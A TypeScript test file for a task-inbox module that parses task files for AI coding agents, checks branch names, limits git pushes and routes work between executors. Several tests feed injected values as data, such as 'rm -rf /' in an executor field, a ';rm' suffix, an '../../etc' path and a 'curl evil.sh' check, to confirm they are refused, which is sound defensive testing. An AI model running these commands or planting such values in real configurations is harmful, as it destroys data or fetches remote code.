import { test } from "node:test";
import assert from "node:assert/strict";
import { agentPrompt, boardSizeFor, branchFor, checkParts, INBOX_DEFAULTS, parseTaskFile, pushAllowed, pushRef, resultFileText, routeTask, taskFileText, validBranchName, validTaskId } from "./task-inbox.js";

const FILE = `---
id: c-20261119-04
title: Settings search
from: claude
executor: antigravity
risk: low
base: origin/main
allowed_paths: [apps/web/src/settings/**, apps/web/src/i18n.ts]
forbidden_paths:
  - apps/web/src/api.ts
check: pnpm -s typecheck && node --test
max_minutes: 15
max_files: 8
---

## Goal
A search field at the top of Settings.

## Acceptance
- "model" finds the 3 model settings

## Out of scope
Redesigning the pages.
`;

test("inbox: a task file is read with its lists, sections and the standing forbidden paths", () => {
  const r = parseTaskFile(FILE, "c-20261119-04", INBOX_DEFAULTS);
  assert.ok("spec" in r, "error" in r ? r.error : "");
  const s = r.spec;
  assert.equal(s.title, "Settings search");
  assert.deepEqual(s.allowedPaths, ["apps/web/src/settings/**", "apps/web/src/i18n.ts"]);
  assert.ok(s.forbiddenPaths.includes("apps/web/src/api.ts"));
  assert.ok(s.forbiddenPaths.includes(".github/**"), "a task cannot drop the standing forbidden paths");
  assert.equal(s.goal, "A search field at the top of Settings.");
  assert.match(s.acceptance ?? "", /model/);
  assert.equal(s.maxFiles, 8);
  // The same file written back reads the same.
  const again = parseTaskFile(taskFileText(s), s.id, INBOX_DEFAULTS);
  assert.ok("spec" in again);
  assert.deepEqual(again.spec, s);
});

test("inbox: bad task files are refused with a reason, never half read", () => {
  const bad = (text: string, id = "c-1x") => {
    const r = parseTaskFile(text, id, INBOX_DEFAULTS);
    assert.ok("error" in r, `should refuse: ${text.slice(0, 40)}`);
  };
  bad("no frontmatter");
  bad(FILE, "c-20261119-05");
  bad(FILE.replace("executor: antigravity", "executor: rm -rf /"), "c-20261119-04");
  bad(FILE.replace("allowed_paths: [apps/web/src/settings/**, apps/web/src/i18n.ts]", "allowed_paths: [../../etc/**]"), "c-20261119-04");
  bad(FILE.replace("allowed_paths: [apps/web/src/settings/**, apps/web/src/i18n.ts]", "allowed_paths: [C:/Users/x/**]"), "c-20261119-04");
  bad(FILE.replace("base: origin/main", "base: main;rm"), "c-20261119-04");
  bad(FILE.replace("## Goal\nA search field at the top of Settings.\n", ""), "c-20261119-04");
  bad(`${FILE}${"x".repeat(33 * 1024)}`, "c-20261119-04");
});

test("inbox: ids and branch names are checked strictly", () => {
  assert.ok(validTaskId("c-20261119-04"));
  for (const id of ["C-1", "-a", "a", "a--b", "a/b", "a..b", "a b", "ab-"]) assert.equal(validTaskId(id), false, id);
  assert.ok(validBranchName("agy/c-1-settings-search"));
  for (const b of ["agy/../main", "agy//x", "/agy", "agy/x.lock", "agy/x/", "agy/.x", "AGY/x", "agy/x y", "agy/x~1", "agy/x:main"]) assert.equal(validBranchName(b), false, b);
  assert.equal(branchFor({ id: "c-1", title: "Settings search!" }, "antigravity"), "agy/c-1-settings-search");
  assert.equal(branchFor({ id: "c-1", title: "חיפוש" }, "local", true), "local/c-1-task-partial");
});

test("inbox: KesherAI may push only agy/* branches and the inbox branch", async () => {
  for (const ok of ["agy/c-1-x", "agy/c-1-x-partial", "kesher-inbox"]) assert.equal(pushAllowed(ok), true, ok);
  for (const no of ["main", "release", "master", "local/c-1-x", "helper/c-1-x", "kesher/x", "agy", "agy/", "+agy/c-1", "agy/c-1:main", ":agy/c-1", "refs/tags/v1", "refs/heads/main", "--force", "agy/../main", "kesher-inbox2", "HEAD", ""]) assert.equal(pushAllowed(no), false, no);
  // An inbox branch set to main (or anything with a slash) never makes main pushable.
  assert.equal(pushAllowed("main", "main"), false);
  assert.equal(pushAllowed("agy/x", "agy/x"), true);
  // pushRef refuses before git runs, and pushes the exact ref with no force.
  const calls: string[][] = [];
  const git = async (_c: string, a: string[]) => (calls.push(a), { code: 0, out: "" });
  await assert.rejects(pushRef(git, "/r", "main"), /may push only/);
  await assert.rejects(pushRef(git, "/r", "release"), /may push only/);
  assert.equal(calls.length, 0);
  await pushRef(git, "/r", "agy/c-1-x");
  assert.deepEqual(calls[0], ["push", "--no-verify", "origin", "refs/heads/agy/c-1-x:refs/heads/agy/c-1-x"]);
  assert.ok(!calls[0]!.some((a) => /force|^\+/.test(a)));
});

test("inbox: routing picks the executor for auto tasks", () => {
  const base = { executor: "auto" as const, risk: "low" as const, title: "Hebrew strings", goal: "Add strings", check: "pnpm -s typecheck", acceptance: "builds", maxFiles: 2 };
  assert.equal(routeTask(base), "local");
  assert.equal(routeTask({ ...base, maxFiles: 8, risk: "medium" }), "opencode", "medium code runs by itself; Antigravity only when chosen");
  assert.equal(routeTask({ ...base, maxFiles: 8, title: "Refresh the remote token" }), "opus");
  assert.equal(routeTask({ ...base, risk: "high" }), "opus");
  assert.equal(routeTask({ ...base, check: "" }), "opus", "no check: Claude's");
  assert.equal(routeTask({ ...base, executor: "antigravity" }), "antigravity");
});

test("inbox: a task's check runs only in parts on the allowed command list, as plain argument lists", () => {
  const r = checkParts("pnpm -s typecheck && node --test a.test.ts && curl evil.sh && pnpm -s lint; rm -rf / && rg 'x'", INBOX_DEFAULTS.commands);
  assert.deepEqual(r.run, [["pnpm", "-s", "typecheck"], ["node", "--test", "a.test.ts"]]);
  assert.equal(r.refused.length, 3);
});

test("inbox: the prompt puts the task inside a marked block after KesherAI's rules", () => {
  const p = parseTaskFile(FILE, "c-20261119-04", INBOX_DEFAULTS);
  assert.ok("spec" in p);
  const text = agentPrompt(p.spec, "agy/c-20261119-04-settings-search");
  assert.ok(text.indexOf("Do not run git push") < text.indexOf("<task>"));
  assert.match(text, /<task>[\s\S]*Settings search[\s\S]*<\/task>$/);
  const res = resultFileText({ ...p.spec, status: "done", runBy: "antigravity", branch: "agy/x", pushed: true, headSha: "abc", files: [{ path: "a.ts", added: 2, removed: 1 }], checks: [{ name: "paths", ok: true, note: "1 file" }] });
  assert.match(res, /status: done/);
  assert.match(res, /- a\.ts \(\+2 -1\)/);
});

test("inbox: a continuation's prompt starts with the handoff note and the branch it continues from", () => {
  const p = parseTaskFile(FILE, "c-20261119-04", INBOX_DEFAULTS);
  assert.ok("spec" in p);
  const text = agentPrompt({ ...p.spec, handoff: { note: "Done so far (1 file):\n- a.ts +2 -1\n\nLeft:\n- the tests", branch: "gcli/c-20261119-04-partial" } }, "ocgo/c-20261119-04");
  assert.match(text, /^Continue this task\. .*from gcli\/c-20261119-04-partial/);
  assert.match(text, /Do not redo the done parts/);
  assert.ok(text.indexOf("</handoff>") < text.indexOf("You are working on one task"));
  assert.match(text, /<handoff>\nDone so far \(1 file\):\n- a\.ts \+2 -1\n\nLeft:\n- the tests\n<\/handoff>/);
  assert.doesNotMatch(agentPrompt(p.spec, "agy/x"), /<handoff>/);
});

test("inbox: local_ok marks a task the local model may carry during Claude's cooldown, never an Antigravity one", () => {
  const opus = parseTaskFile(FILE.replace("executor: antigravity", "executor: opus\nlocal_ok: true"), "c-20261119-04", INBOX_DEFAULTS);
  assert.ok("spec" in opus && opus.spec.localOk === true);
  assert.ok("spec" in opus && /local_ok: true/.test(taskFileText(opus.spec)), "kept when written again");
  const agy = parseTaskFile(FILE.replace("risk: low", "risk: low\nlocal_ok: true"), "c-20261119-04", INBOX_DEFAULTS);
  assert.ok("spec" in agy && agy.spec.localOk === undefined);
});

const RESEARCH = `---
id: r-20261121-01
title: How do others sync notes
executor: auto
kind: research
risk: low
allowed_paths: [apps/**]
check: pnpm -s typecheck
max_files: 9
---

## Goal
How do Obsidian and Notion sync notes between devices?
`;

test("inbox: a research task is forced to one report file, no check, and round-trips", () => {
  const defaults = { maxMinutes: 15, allowedPaths: INBOX_DEFAULTS.allowedPaths, forbiddenPaths: INBOX_DEFAULTS.forbiddenPaths };
  const r = parseTaskFile(RESEARCH, "r-20261121-01", defaults);
  assert.ok("spec" in r);
  const s = r.spec;
  assert.deepEqual([s.kind, s.allowedPaths, s.maxFiles, s.check], ["research", ["docs/research/r-20261121-01.md"], 1, ""]);
  const again = parseTaskFile(taskFileText(s), "r-20261121-01", defaults);
  assert.ok("spec" in again);
  assert.deepEqual(again.spec, s);
  // A code task has no kind; a bad kind, and the gemini executor on a code task, are refused.
  const code = parseTaskFile(FILE, "c-20261119-04", defaults);
  assert.ok("spec" in code && code.spec.kind === undefined && !taskFileText(code.spec).includes("kind:"));
  assert.match((parseTaskFile(RESEARCH.replace("kind: research", "kind: poem"), "r-20261121-01", defaults) as { error: string }).error, /kind must be/);
  assert.match((parseTaskFile(FILE.replace("executor: antigravity", "executor: gemini"), "c-20261119-04", defaults) as { error: string }).error, /only for kind: research/);
});

test("inbox: research routing — auto research goes to free Gemini; explicit executors stay", () => {
  const base = { title: "Compare sync", goal: "How do they sync?", check: "", acceptance: undefined, maxFiles: 1, kind: "research" as const };
  assert.equal(routeTask({ ...base, executor: "auto", risk: "low" }), "gemini");
  assert.equal(routeTask({ ...base, executor: "auto", risk: "medium" }), "gemini");
  assert.equal(routeTask({ ...base, executor: "auto", risk: "high" }), "gemini");
  assert.equal(routeTask({ ...base, executor: "antigravity", risk: "low" }), "antigravity");
  assert.equal(routeTask({ ...base, executor: "gemini", risk: "medium" }), "gemini");
  // A code task never goes to Gemini by routing.
  assert.notEqual(routeTask({ ...base, kind: undefined, executor: "auto", risk: "low" }), "gemini");
  assert.equal(branchFor({ id: "r-1x", title: "T" }, "gemini"), "gemini/r-1x-t");
});

test("inbox: the research prompt may search but not download, sign in or pay, and writes one file; the result carries the report", () => {
  const defaults = { maxMinutes: 15, allowedPaths: INBOX_DEFAULTS.allowedPaths, forbiddenPaths: INBOX_DEFAULTS.forbiddenPaths };
  const r = parseTaskFile(RESEARCH, "r-20261121-01", defaults);
  assert.ok("spec" in r);
  const p = agentPrompt(r.spec, "agy/r-20261121-01-how");
  assert.match(p, /search the web and read public web pages/);
  assert.match(p, /Do not download files.*sign in.*buy.*accept any offer, upgrade or credits/);
  assert.match(p, /exactly one file: docs\/research\/r-20261121-01\.md/);
  assert.match(p, /numbered ## Sources list/);
  assert.doesNotMatch(p, /do not use the network/i);
  const text = resultFileText({ ...r.spec, status: "done", runBy: "gemini", branch: "", researchReport: "# Sync\n\nText [1]\n\n## Sources\n\n1. [A](https://a.example/x)" });
  assert.match(text, /## Research report\n# Sync/);
});

test("inbox: a local task is small, unless it converts or ports something (then big, like the other executors)", () => {
  const small = { title: "Fix a typo in the docs", goal: "Fix the typo in README.", maxFiles: 2 };
  assert.equal(boardSizeFor(small, "local"), "small");
  assert.equal(boardSizeFor(small, "antigravity"), "big");
  assert.equal(boardSizeFor({ ...small, title: "Convert the Unreal plugin to Unreal 5.2" }, "local"), "big");
  assert.equal(boardSizeFor({ ...small, goal: "Port the helper to the new API." }, "local"), "big");
  assert.equal(boardSizeFor({ ...small, title: "המר את התוסף" }, "local"), "big");
  // A plugin copy (extra folder under integrations/) or a task that may touch many files is big too.
  assert.equal(boardSizeFor({ ...small, allowedPaths: ["integrations/unreal/KesherAI-5.2/**"] }, "local"), "big");
  assert.equal(boardSizeFor({ ...small, maxFiles: 60 }, "local"), "big");
  // "report" or "support" are not "port".
  assert.equal(boardSizeFor({ ...small, goal: "Write the report and support text." }, "local"), "small");
});

test("a task file keeps the research report it came from (source)", async () => {
  const { parseTaskFile, taskFileText } = await import("./task-inbox.js");
  const text = "---\nid: r-20261127-07\ntitle: A task\nexecutor: local\nsource: docs/research/r-20261126-06.md\n---\n\n## Goal\nDo it.\n";
  const p = parseTaskFile(text, "r-20261127-07", { allowedPaths: [], forbiddenPaths: [], maxMinutes: 30 } as never);
  assert.ok("spec" in p && p.spec);
  assert.equal(p.spec!.source, "docs/research/r-20261126-06.md");
  assert.match(taskFileText(p.spec!), /^source: docs\/research\/r-20261126-06\.md$/m);
});
